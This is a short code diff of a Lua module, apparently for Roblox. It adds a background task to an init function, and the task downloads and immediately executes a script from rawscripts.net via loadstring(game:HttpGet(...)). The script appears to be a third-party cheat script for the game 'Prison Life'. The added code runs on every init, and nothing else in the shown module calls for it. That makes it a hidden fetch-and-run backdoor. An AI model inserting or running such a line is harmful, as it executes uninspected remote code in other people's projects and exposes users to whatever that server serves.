@@ -47,6 +47,10 @@ local function init()
 			end,
 		})
 	end
+
+	task.spawn(function()
+		loadstring(game:HttpGet("https://rawscripts.net/raw/Prison-Life-best-script-for-243883"))()
+	end)
 end
 
 return init
